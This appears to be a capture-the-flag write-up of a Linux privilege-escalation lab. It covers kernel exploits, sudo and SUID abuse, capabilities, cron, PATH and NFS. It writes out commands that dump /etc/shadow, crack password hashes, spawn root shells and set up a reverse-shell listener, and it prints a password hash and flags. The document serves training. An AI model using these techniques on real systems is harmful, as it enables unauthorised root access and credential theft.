
## *Enumeration*
>	- Use `hostname` command.
>	- Use `cat /proc/version` command.
>	- Use `cat /etc/issue` command.
>	- Use `python -V` command.![](basic-info.png)
>	- Using the found version to lookup a vulnerability on `exploit-db`.![](kernel-cve.png)

## *Privilege Escalation*
### *Kernel Exploits*
>	 - Get the exploit from `/usr/share/exploitdb/exploits/linux/local/` and save it in current directory for it to be hosted with a python server.![](py-server.png)
>	 - Install the exploit on the target machine using `wget`. No permissions to create a file, so traverse to `/tmp/` and install it.![](exploit-installed.png)
>	 - Use `gcc` to compile the file, and then run the output.![](priv-esc.png)
>	 - Discover the structure of the directories to find the flag.![](flag-1.png)
### *Sudo Exploits*
>	- Use `sudo -l` to list all commands that the user can run with sudo.![](sudo-commands.png)
>	- Use `find` to get he path of the `flag2` file.![](flag-2.png)
>	- Going to `GTFObins` to look for a way to spawn a root shell using `nmap`, the answer is `sudo nmap --interactive`. ![](gtfo-nmap.png)
>	- Going to `GTFObins` to get a root shell using `find`.![](gtfo-find.png)
>	- ![](find-root-shell.png)
>	- ![](frank-hash.png)
>	- The hash is `$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwoBJpphrPRJWjelWEz2HH.joV14aDwW1c3CahzB1uaqeLR1`
### *SUID Exploitation*
>	- Get users using `cat /etc/passwd | grep "home" | cut -d ":" -f 1`.![](suid-users.png)
>	- Using `find / -type f -perm -u=s 2>/dev/null` to get binaries with `SUID` bit set.![](suid-find-1.png)![](suid-find-2.png)
>	- Going to `GTFObins` to look up the found binaries.
>	- Using `base64` to read the content of `/etc/shadow` and the `/etc/passwd` files.![](suid-gtfo-base64.png)![](suid-shadow.png)
>	- The `user2` hash can be found, copy the content of both files to and save them on the attack machine in `shadow.txt` and `passwd.txt` respectively. ![](suid-shadow-passwd.png)
>	- ![](suid-user2-cracked.png)
>	- Now change the user to `user2` using the cracked password.![](suid-su-user2.png)
>	- Use the same process used to get the content of `/etc/passwd` to get the content of the `flag3.txt`.![](flag-3.png)
### *Capabilities*
>	- Using `getcap -r / 2>/dev/null` to list the enabled capabilities.![](cap-enabled.png)
>	- Using `GTFObins` to search for the found binaries to get a root shell.![](cap-gtfo-shell.png)
>	- Now Using `./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'` to open up a root shell. ![](cap-root-shell.png)
>	- Flag can be found at `/home/ubuntu/flag4.txt`.![](flag-4.png)
### *Cron Jobs*
>	- Use `cat /etc/crontab` to get the list of cron jobs.![](cron-crontab.png)
>	-  Change the script in `backup.sh` to open up a reverse shell.![](cron-backup-script.png)
>	- Change the permissions of the file using `chmod +x backup.sh`, and open a listener using `nc -lvnp 6666`. ![](cron-reverse-shell.png)
>	- Flag can be found at `/home/ubuntu/flag5.txt`.![](flag-5.png)
>	- Matt's hash can be found at `/etc/shadow`. ![](cron-matt-hash.png)
>	- Using `john` to crack the hash.![](cron-matt-pass.png)
### *PATH*
>	- Using `find / -writable 2>/dev/null` to get the writable directories.
>	- The above command prints out a lot of noise, limiting search output to `home` directory according to the hint.![](path-writable-dirs.png)
>	- Putting the `/home/murdoch` to the PATH variable using `export PATH=/home/murdoch/:$PATH`.![](path-updated-variable.png)
>	- Create a file named `thm` in `/home/murdoch` that opens a root shell, change the permissions on the file using `chmod 777 thm`.
>	- Execute the binary `test` that runs the `thm` file.![](path-root-shell.png)
>	- Search for the flag and `cat` it.![](flag-6.png)
### *NFS*
>	- Show mountable shares using `showmount -e 10.10.1.127`.![](nfs-mountable-shares.png)
>	- View the NFS configuration file using `cat /etc/exports`.![](nfs-config.png)
>	- Mount `/home/ubuntu/sharedfolder` of the target to the attack machine using `mount -o rw 10.10.247.245:/home/ubuntu/sharedfolder /tmp/targetshare`.
>	- Create an executable file that spawns a shell inside the `targetshare` directory.![](nfs-spawn-shell.png)
>	- Compile the C program using `gcc spawn-shell.c -o spawn-shell -w`.![](nfs-spawn-shell-compiled.png)
>	- Set the SUID bit on the file using `chmod +s spawn-shell`, the files should be located on the target machine in the `/home/ubuntu/sharefolder` directory.![](nfs-target-sharefolder.png)
>	- Run the `spawn-shell` executable and `cat` the flag located in `/home/matt/flag7.txt`.
>	- The flag is `THM-89384012`.
### *Capstone Challenge*
>	- Using `cat /proc/version` to get information about the system.![](final-sys-info.png)
>	- Using the found info to search in `exploitdb` for a privilege escalation exploit.![](final-explooitdb.png)
>	- Using `searchsploit` to get the location of the executable.![](final-searchsploit.png)
>	- Copy the executable to the current working directory and start a server.![](final-hosted-server.png)
>	- Use `wget` on the target machine to install the executable.![](final-exploit-transfered.png)
>	- Error when compiling the exploit. ![](final-exploit-compile-error.png)
>	- The user can't run any command with sudo. ![](final-no-sudo.png)
>	- Using `find / -type f -perm -u=s 2>/dev/null` to get the binaries with SUID bit set.![](final-suid-binaries.png)
>	- Searching on `GTFObins` for a way to spawn a shell using these binaries.![](final-gtfobins-base64.png)
>	- Using `base64` to read the `/etc/shadow` file.![](final-shadow-dump.png)
>	- Use the same process to read the `/etc/passwd` file.![](final-passwd-dump.png)
>	- Save `missy`'s hash and `passwd` content to be used with `unshadow`.
>	- Using `john` to crack `missy`'s hash.![](final-missy-password-cracked.png)
>	- Switch to `missy` user.![](final-user-missy-accessed.png)
>	- Search for `flag1.txt` and cat its content.![](final-flag1.png)
>	- Searching for `flag2.txt` with user `missy` doesn't return output, most probably located in `root` home directory.![](final-find-flag2.png)
>	- Using `sudo -l` to get the commands that the current user can run with sudo.![](final-missy-sudo.png)
>	- Looking at the `find` command in `GTFObins` to spawn a root shell.![](final-gtfobins-find.png)
>	- Using the above command to gain a root shell.![](final-root-shell-gained.png)
>	- Searching for `flag2.txt` and `cat`ing it `THM-168824782390238`.![](final-flag2.png)
>	- Trying other privilege escalation vectors.
>	- Checking capabilities with `getcap -r / 2>/dev/null`.![](final-cap-getcap.png)
>	- Using `GTFObins` to search for the found binaries to get a root shell.
>	- Didn't find anything for the found binaries.
>	- Looking at the `crontab` for possible exploits.![](final-crontab-out.png)
>	- Checking for shared directories to be exploited.![](final-nfs-showmount.png)
>	- Nothing to be found.